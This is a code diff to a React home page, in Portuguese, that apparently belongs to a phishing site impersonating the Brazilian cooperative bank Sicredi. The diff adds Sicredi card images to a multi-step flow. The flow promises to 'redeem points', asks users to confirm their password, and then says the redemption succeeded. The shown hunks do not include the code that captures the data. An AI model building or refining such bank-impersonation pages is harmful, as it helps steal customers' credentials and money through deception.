@@ -216,7 +216,7 @@ export default function HomePage() {
             </h2>
             
             <div className="my-4">
-              <SicrediLogo className="mx-auto h-16" />
+              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-32 object-contain rounded-lg" />
             </div>
             
             <p className="mb-6">Antes de prosseguir, apenas precisamos validar algumas informações.</p>
@@ -233,6 +233,10 @@ export default function HomePage() {
             <h2 className="text-2xl font-semibold mb-3">
               Quase lá!
             </h2>
+            
+            <div className="my-4">
+              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-28 object-contain rounded-lg" />
+            </div>
             
             <p className="mb-6">Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:</p>
             
@@ -287,6 +291,10 @@ export default function HomePage() {
             </div>
             
             <h2 className="text-2xl font-bold text-[#33820D] mb-3">Parabéns!</h2>
+            
+            <div className="my-4">
+              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-28 object-contain rounded-lg" />
+            </div>
             
             <p className="text-lg mb-2">Seus pontos foram validados com sucesso!</p>
             <p className="mb-6">O resgate será processado e você receberá o valor em até 3 dias úteis.</p>
